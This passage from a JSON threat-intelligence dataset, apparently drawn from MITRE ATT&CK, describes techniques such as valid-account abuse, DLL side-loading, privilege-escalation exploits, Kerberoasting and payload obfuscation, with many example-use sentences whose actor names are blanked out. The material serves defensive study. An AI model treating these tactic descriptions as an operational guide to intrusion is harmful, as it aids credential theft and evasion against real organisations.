      "malware has collected Microsoft Office documents from mapped network drives.",
      "can collect any files found in the enumerated drivers before sending it to its C2 channel.",
      "can collect data from network drives and stage it for exfiltration.",
      "When it first starts  crawls the victim's mapped drives and collects documents with the following extensions: .doc .docx .pdf .ppt .pptx and .txt.",
      "has collected data of interest from network shares.",
      "During  the threat actors collected files from network shared drives prior to network encryption.",
      "has searched network shares to access sensitive documents.",
      "has collected data about network drives."
    ],
    "id": "T1039",
    "name": "Data from Network Shared Drive",
    "similar_words": [
      "Data from Network Shared Drive"
    ]
  },
  "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81": {
    "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
    "example_uses": [
      "compromised user credentials and used valid accounts for operations.",
      "creates valid users to provide access to the system.",
      "has used valid accounts for privilege escalation.",
      "has utilized  during and.",
      "has used valid, compromised email accounts for defense evasion, including to send malicious emails to other victim organizations.",
      "has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.",
      "leverages valid accounts after gaining credentials for use within the victim domain.",
      "has used compromised credentials to access other systems on a victim network.",
      "has used legitimate local admin account credentials.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "has used legitimate credentials to maintain access to a victim network and exfiltrate data. The group also used credentials stolen through a spearphishing email to login to the DCCC network.",
      "has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor. The group has also moved laterally using the Local Administrator account.",
      "has used valid accounts shared between Managed Service Providers and clients to move between the two environments.",
      "can use known credentials to run commands and spawn processes as another user.",
      "If  cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.",
      "Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
      "used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.",
      "To move laterally on a victim network,  has used credentials stolen from various systems on which it gathered usernames and password hashes.",
      "actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.",
      "actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.",
      "actors leverage legitimate credentials to log into external remote services.",
      "attempts to obtain legitimate credentials during operations.",
      "actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.",
      "used compromised credentials to log on to other systems.",
      "has used valid accounts for persistence and lateral movement.",
      "has used legitimate credentials to hijack email communications.",
      "has harvested valid administrative credentials for lateral movement.",
      "has used valid SSH credentials to access remote hosts.",
      "has compromised user credentials and used valid accounts for operations.",
      "leveraged valid accounts to maintain access to a victim network.",
      "During the  campaign  used compromised VPN accounts.",
      "has used administrator credentials to gain access to restricted network segments.",
      "has used a valid account to maintain persistence via scheduled task.",
      "used hard-coded credentials to gain access to a network share.",
      "can use supplied user credentials to execute processes and stop services.",
      "During  threat actors used compromised VPN accounts to gain access to victim systems.",
      "has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.",
      "have used previously acquired legitimate credentials prior to attacks.",
      "has used compromised user accounts to deploy payloads and create system services.",
      "uses valid account information to remotely access victim networks such as VPN credentials.",
      "has used compromised credentials and/or session tokens to gain access into a victim's VPN VDI RDP and IAMs.",
      "During  threat actors used valid VPN credentials to gain initial access.",
      "has used legitimate credentials to gain initial access maintain access and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone printer and video decoder.",
      "During the   used valid accounts on the corporate network to escalate privileges move laterally and establish persistence within the corporate network.",
      "has used previously compromised administrative accounts to escalate privileges.",
      "has obtained valid accounts to gain initial access.",
      "has used compromised credentials to log on to other systems and escalate privileges.",
      "has used valid credentials for privileged accounts with the goal of accessing domain controllers.",
      "has used a compromised account to access an organization's VPN infrastructure.",
      "has used credential dumpers or stealers to obtain legitimate credentials which they used to gain access to victim accounts.",
      "has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.",
      "has used valid accounts for initial access and privilege escalation.",
      "To move laterally on a victim network  has used credentials stolen from various systems on which it gathered usernames and password hashes.",
      "has used valid credentials with various services during lateral movement.",
      "has used valid compromised credentials to gain access to victim environments.",
      "has used legitimate VPN RDP Citrix or VNC credentials to maintain access to a victim environment.",
      "acquires valid SSH accounts through brute force.",
      "has used compromised credentials to obtain unauthorized access to online accounts.",
      "has used stolen credentials to compromise Outlook Web Access (OWA).",
      "During the   used different compromised credentials for remote access and to move laterally.",
      "relies primarily on valid credentials for persistence.",
      "has used valid VPN accounts to achieve initial access.",
      "has used valid accounts for initial access and lateral movement.  has also maintained access to the victim environment through the VPN infrastructure.",
      "has used compromised valid accounts for access to victim environments.",
      "has used stolen credentials to sign into victim email accounts.",
      "During  threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts.",
      "During  threat actors extracted sensitive credentials while moving laterally through compromised networks.",
      "used captured valid account information to log into victim web applications and appliances during .",
      "has gained access to victim environments through legitimate VPN credentials.",
      "used compromised credentials to maintain long-term access to victim environments."
    ],
    "id": "T1078",
    "name": "Valid Accounts",
    "similar_words": [
      "Valid Accounts"
    ]
  },
  "attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09": {
    "description": "Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)\n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",
    "example_uses": [
      "launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.",
      "uses DLL side-loading to load malicious programs.",
      "ran genuinely-signed executables from Symantec and McAfee which loaded a malicious DLL called rastls.dll.",
      "A  .dll that contains  is loaded and executed using DLL side-loading.",
      "has used DLL side-loading to load malicious payloads.",
      "A  variant has used DLL side-loading.",
      "has been known to side load DLLs with a valid version of Chrome with one of their tools.",
      "side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.",
      "has used DLL side-loading.",
      "DLL side-loading has been used to execute  through a legitimate Citrix executable ssonsvr.exe which is vulnerable to the technique. The Citrix executable was dropped along with  by the dropper.",
      "typically loads its DLL file into a legitimate signed Java or VMware executable.",
      "has been loaded onto Exchange servers and disguised as an ISAPI filter (DLL file). The IIS w3wp.exe process then loads the malicious DLL.",
      "has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.",
      "During the  installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.",
      "uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.",
      "has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .",
      "actors have used DLL side-loading. Actors have used legitimate Kaspersky anti-virus variants in which the DLL acts as a stub loader that loads and executes the shell code."
    ],
    "id": "T1073",
    "name": "DLL Side-Loading",
    "similar_words": [
      "DLL Side-Loading"
    ]
  },
  "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839": {
    "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
    "example_uses": [
      "has used exploits to increase their levels of rights and privileges.",
      "has leveraged a zero-day vulnerability to escalate privileges.",
      "has exploited the CVE-2016-0167 local vulnerability.",
      "exploits CVE-2016-4117 to allow an executable to gain escalated privileges.",
      "can exploit vulnerabilities such as MS14-058.",
      "has used CVE-2016-7255 to escalate privileges.",
      "attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.",
      "has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.",
      "has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.",
      "has used CVE-2014-6324 to escalate privileges.",
      "has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.",
      "has used CVE-2014-4076, CVE-2015-2387, and CVE-2015-1701 to escalate privileges.",
      "has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.",
      "contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.",
      "has exploited CVE-2021-36934 to escalate privileges on a compromised host.",
      "has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.",
      "can exploit vulnerabilities such as MS16-032 and MS16-135.",
      "can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.",
      "has exploited multiple Windows vulnerabilities (CVE-2010-2743 CVE-2010-3338 CVE-2010-4398 CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.",
      "has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.",
      "During   abused named pipe impersonation for privilege escalation.",
      "has exploited CVE-2021-1732 to execute malware components with elevated rights.",
      "has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660 CVE-2011-2005 and CVE-2010-4398 all of which could allow local users to access kernel-level privileges.",
      "has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.",
      "has exploited CVE-2021-1732 for privilege escalation.",
      "used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.",
      "has exploited unpatched vulnerabilities on internally accessible servers including JIRA GitLab and Confluence for privilege escalation.",
      "has leveraged a vulnerability in Windows containers to perform an .",
      "has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.",
      "has the ability to leverage local and remote exploits to escalate privileges.",
      "has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).",
      "has exploited CVE-2014-4076 CVE-2015-2387 CVE-2015-1701 CVE-2017-0263 to escalate privileges.",
      "has exploited CVE-2017-0005 for local privilege escalation.",
      "has exploited CVE-2019-0803 and MS16-032 to escalate privileges.",
      "can use CVE-2019-0859 to escalate privileges on a compromised host.",
      "has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.",
      "has used the BOtB tool which exploits CVE-2019-5736.",
      "has used a vulnerable signed VBoxDrv driver to bypass Microsoft Driver Signature Enforcement (DSE) protections and subsequently load the unsigned  driver.",
      "has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services.",
      "has targeted unpatched applications to elevate access in targeted organizations.",
      "exploits a vulnerability in the RTCore64.sys driver (CVE-2019-16098) to enable privilege escalation and defense evasion when run as a service.",
      "has exploited CVE-2024-37085 in VMWare ESXi software for authentication bypass and subsequent privilege escalation.",
      "exploited software vulnerabilities in victim environments to escalate privileges during .",
      "has exploited CVE-2014-4076 CVE-2015-2387 CVE-2015-1701 CVE-2017-0263 and CVE-2022-38028 to escalate privileges.",
      "During  threat actors downloaded a privilege escalation payload to gain root access.",
      "has exploited the Windows Kernel Elevation of Privilege vulnerability CVE-2024-30088."
    ],
    "id": "T1068",
    "name": "Exploitation for Privilege Escalation",
    "similar_words": [
      "Exploitation for Privilege Escalation"
    ]
  },
  "attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0": {
    "description": "Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)",
    "example_uses": [
      "Invoke-Kerberoast module can request service tickets and return crackable ticket hashes."
    ],
    "id": "T1208",
    "name": "Kerberoasting",
    "similar_words": [
      "Kerberoasting"
    ]
  },
  "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a": {
    "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
    "example_uses": [
      "has obfuscated strings in  by base64 encoding, and then encrypting them.",
      "DLL file and non-malicious decoy file are encrypted with RC4.",
      "is obfuscated using the open source ConfuserEx protector.  also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.",
      "uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.",
      "The PowerShell script with the  payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.",
      "obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR.",
      "sends images to users that are embedded with shellcode and obfuscates strings and payloads.",
      "A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.",
      "has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.",
      "is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.",
      "encrypts strings to make analysis more difficult.",
      "uses RC4 and Base64 to obfuscate strings.",
      "A  variant is encoded using a simple XOR cipher.",
      "was likely obfuscated using Invoke-Obfuscation.",
      "used Base64 to obfuscate commands and the payload.",
      "’s Java payload is encrypted with AES.",
      "’s installer is obfuscated with a custom crypter to obfuscate the installer.",
      "has obfuscated a script with Crypto Obfuscator.",
      "downloads additional files that are base64-encoded and encrypted with another cipher.",
      "encodes files in Base64.",
      "hides any strings related to its own indicators of compromise.",
      "APIs and strings in some  variants are RC4 encrypted. Another variant is encoded with XOR.",
      "encrypts strings in the backdoor using a custom XOR algorithm.",
      "executes and stores obfuscated Perl scripts.",
      "uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.",
      "drops files with base64-encoded data.",
      "avoids analysis by encrypting all strings, internal files, configuration data.",
      "uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2.  also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.",
      "is obfuscated using the obfuscation tool called ConfuserEx.",
      "uses a simple one-byte XOR method to obfuscate values in the malware.",
      "payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.",
      "obfuscated scripts that were used on victim machines.",
      "supports file encryption (AES with the key \"lolomycin2017\").",
      "A  uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.",
      "Some  strings are base64 encoded, such as the embedded DLL known as MockDll.",
      "first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.",
      "has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.",
      "has encrypted documents and malicious executables.",
      "has used Daniel Bohannon’s Invoke-Obfuscation framework. The group also used files with base64 encoded PowerShell commands.",
      "uses basic obfuscation in the form of spaghetti code.",
      "is loaded and executed by a highly obfuscated launcher.",
      "can be used to embed a PowerShell script within the pixels of a PNG file.",
      "Some strings in are obfuscated with XOR x56.",
      "has obfuscated code using base64 and gzip compression.",
      "contains a collection of ScriptModification modules that compress and encode scripts and payloads.",
      "uses character replacement,  environment variables, and XOR encoding to obfuscate code.",
      "has encrypted its payload with RC4.",
      "has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.",
      "has encrypted and encoded data in its malware, including by using base64.",
      "obfuscates files or information to help evade defensive measures.",
      "uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.",
      "malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.",
      "The  config file is encrypted with RC4.",
      "obfuscates API function names using a substitute cipher combined with Base64 encoding.",
      "logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.",
      "is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.",
      "encrypts some of its files with XOR.",
      "The  dropper uses a function to obfuscate the name of functions and other parts of the malware.",
      "code may be obfuscated through structured exception handling and return-oriented programming.",
      "Variants of  encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.",
      "contains base64-encoded strings.",
      "Most strings in  are encrypted using 3DES and XOR and reversed.",
      "uses single-byte XOR obfuscation to obfuscate many of its files.",
      "uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation.",
      "The payload of  is encrypted with simple XOR with a rotating key. The  configuration file has been encrypted with RC4 keys.",
      "Most of the strings in  are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.",
      "encrypts several of its files, including configuration files.",
      "obfuscates strings using a custom stream cipher.",
      "has used XOR with 0x90 to obfuscate its configuration file.",
      "uses multiple techniques to obfuscate strings, including XOR.",
      "A version of  introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.",
      "is obscured using XOR encoding and appended to a valid GIF file.",
      "obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.",
      "Many strings in  are obfuscated with a XOR algorithm.",
      "strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.",
      "Some data in  is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.",
      "Some resources in  are encrypted with a simple XOR operation or encoded with Base64.",
      "obfuscates internal strings and unpacks them at startup.",
      "uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).",
      "appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.",
      "A  configuration file is encrypted with a simple XOR key, 0x53.",
      "uses various XOR techniques to obfuscate its components.",
      "obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.",
      "disguised its malicious binaries with several layers of obfuscation, including encrypting the files.",
      "has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.",
      "malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.",
      "Droppers used by  use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.",
      "encrypted a .dll payload using RTL and a custom encryption algorithm.  has also obfuscated payloads with base64, XOR, and RC4.",
      "has obfuscated tools and malware it uses with VMProtect.",
      "can use anti-disassembly and code transformation obfuscation techniques.",
      "has been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators.",
      "has obfuscated strings with base64 encoding.",
      "can encrypt victim data with an RC4 cipher.",
      "uses a XOR cipher to encrypt command output written to its OneDrive C2 server.",
      "has obfuscated strings such as antivirus vendor names domains files and others.",
      "can custom encrypt strings.",
      "has encrypted strings with RC4.",
      "has used XOR encrypted payloads in WebSocket client to server messages.",
      "has the ability to base64 encode and XOR encrypt strings.",
      "has modified UPX headers after packing files to break unpackers.",
      "has the ability to encode data.",
      "can base64 encode and AES-128-CBC encrypt data prior to transmission.",
      "used a modified version of  in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.",
      "obfuscated shellcode used during execution.",
      "has been obfuscated to help avoid detection.",
      "s plugins were obfuscated with Eazfuscater.NET 3.3.",
      "can use stackstrings for obfuscation.",
      "initially downloads a hidden encoded file.",
      "can use VMProtect for obfuscation.",
      "has the ability to obfuscate strings using XOR encryption.",
      "has encrypted its virtual file system using AES-256 in XTS mode.",
      "obfuscates strings with base64 encoding.",
      "encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for  source code and data extracted from the SolarWinds Orion <MsBuild.exe process.",
      "has been compressed and stored within a registry key.  has also obfuscated the AES key used for encryption.",
      "can generate encrypted compressed/encoded or otherwise obfuscated code modules.",
      "uses multiple techniques to obfuscate strings including XOR.",
      "has used a custom obfuscation algorithm to hide strings including Registry keys APIs and DLL names.",
      "can encrypt strings with XOR-based routines and use a custom AES storage format for plugins configuration C2 domains and harvested data.",
      "attachments have been delivered via compressed archive files.  also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.",
      "has had its code obfuscated in an apparent attempt to make analysis difficult.  has used the Rijndael symmetric encryption algorithm to encrypt strings.",
      "uses non-descriptive names to hide functionality.",
      "can use control flow flattening to obscure code.",
      "created and read from a file with a fake JPG header and its payload was encrypted with a simple rotating XOR cipher.",
      "The  executable has been obfuscated when dropped on a compromised host.",
      "has used encrypted payload files and maintains an encrypted configuration structure in memory.",
      "has hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.",
      "has obfuscated malware to help avoid detection.",
      "uses a hard-coded string as a seed along with the victim machine hardware identifier and input text to generate a unique string used as an internal mutex value to evade static detection based on mutexes.",
      "has been delivered within ZIP or RAR password-protected archived files.",
      "During   broke malicious binaries including  and  into multiple sections on disk to evade detection.",
      "has used multiple layers of obfuscation to avoid analysis including its Base64 encoded payload.",
      "strings are obfuscated using RC4.",
      "decrypter have been inflated with junk code in between legitimate API functions and also included infinite loops to avoid analysis.",
      "can use XOR AES and DES to encrypt loader shellcode.",
      "uses Base64 encoding for strings.",
      "strings were compressed and encoded in Base64.  also obfuscated collected system information using a FNV-1a + XOR algorithm.",
      "uses RC4 and base64 to obfuscate data including Registry entries and file paths.",
      "can encrypt encode and compress multiple layers of shellcode.",
      "can use base64 encoding string stacking and opaque predicates for obfuscation.",
      "has used ConfuserEx to obfuscate its variant of  compressed payload and RAT packages and password protected encrypted email attachments to avoid detection.",
      "'s commands strings and domains can be Base64 encoded within the payload.",
      "has the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials.",
      "During the   used heavily obfuscated code with  in its Windows Notepad backdoor.",
      "has obfuscated data with base64 AES RC4 and bz2.",
      "uses VMProtect to make reverse engineering the malware more difficult.",
      "can encrypt data prior to exfiltration by using an RSA public key.",
      "can use encryption and base64 encoding to hide strings and to enforce access control once deployed.",
      "has obfuscated code with stack strings and string encryption.",
      "has the ability to compress stings with QuickLZ.",
      "has used string encoding with floating point calculations.",
      "has used Base64-encoded shellcode strings.",
      "has obfuscated its strings with a simple XOR encryption with a static key.",
      "can use compiler-based obfuscation for its code encrypt DLLs and hide Windows API calls.",
      "encrypts all strings using RC4 and bundles all functionality into a single function call.",
      "obfuscates strings and payloads.",
      "avoids analysis by encrypting all strings internal files configuration data and by using a custom executable format.",
      "has been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions.",
      "has obfuscated binary strings including the use of XOR encryption and Base64 encoding.  has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.",
      "has encrypted strings.",
      "During  the threat actors used Base64-encoded strings.",
      "encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.",
      "has Base64 encoded the RSA public key used for encrypting files.",
      "can Base64 encode output strings prior to sending to C2.",
      "has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.",
      "has the ability to Base64 encode its payload and custom encrypt API calls.",
      "used the StackStrings obfuscation technique to hide malicious functionalities.",
      "Most of the strings in  are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed presumably to avoid detection in memory.",
      "has obfuscated its code to prevent its removal from host machines.",
      "itself is obfuscated and uses obfuscated API calls.",
      "has delivered initial payloads hidden using archives and encoding measures.",
      "has encrypted its payload a virtual file system and various files.",
      "uses encoded strings in its process kill list.",
      "can use control-flow flattening or the commercially available .NET Reactor for obfuscation.",
      "can obfuscate strings using the congruential generator `(LCG): staten+1 = (690069  staten + 1) mod 232`.",
      "has used Base64 encoding within malware variants.",
      "has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.",
      "used Base64 to encode strings.",
      "has the ability to encode and RC6 encrypt data sent to C2.",
      "has used Base64 to encode malicious links.  has also delivered compressed payloads in ZIP files to victims.",
      "obfuscates files by splitting strings into smaller sub-strings and including garbage strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.",
      "has used encrypted strings.",
      "strings network data configuration and modules are encrypted with a modified RC4 algorithm.  has also been delivered to targets as various archive files including ZIP 7-ZIP and RAR.",
      "has used a custom base64 alphabet to decode files.",
      "can use certain ConfuserEx features for obfuscation and can be encoded in a base64 string.",
      "has delivered self-extracting 7z archive files within malicious document attachments.",
      "has XOR-encrypted collected system information prior to sending to a C2.  has also used the open source ADVObfuscation library for its components.",
      "can be partly encrypted with XOR.",
      "has used XOR-encoded strings.",
      "has used a custom encryption scheme for communication between scripts.",
      "has base64-encoded its portable executable and hidden itself under a JPG header.  can also embed information within document footers.",
      "has hashed most its code's functions and encrypted payloads with base64 and XOR.",
      "can store obfuscated configuration information in the last 56 bytes of the file `/date/.bd.key/preload.so`.",
      "has decrypted strings and other important information during the encryption process.  also calls certain functions dynamically to hinder analysis.",
      "heavily obfuscates its code to make analysis more difficult.",
      "can use API hashing and modify the names of strings to evade detection.",
      "s Java payload is encrypted with AES. Additionally backdoor files are encrypted using DES as a stream cipher. Later variants of  also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.",
      "has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.",
      "encrypted gathered information with a combination of shifting and XOR using a static key.",
      "used VMProtected binaries in multiple intrusions.",
      "has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.",
      "can hide malicious code in the padding regions between legitimate functions in the Pulse Secure `libdsplibs.so` file.",
      "has used an encrypted Virtual File System to store plugins.",
      "obfuscates its code and encrypts the API names.",
      "is heavily obfuscated in many ways including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.",
      "can encrypt the names of requested APIs and deliver its final payload as a compressed encrypted and base64 encoded blob.",
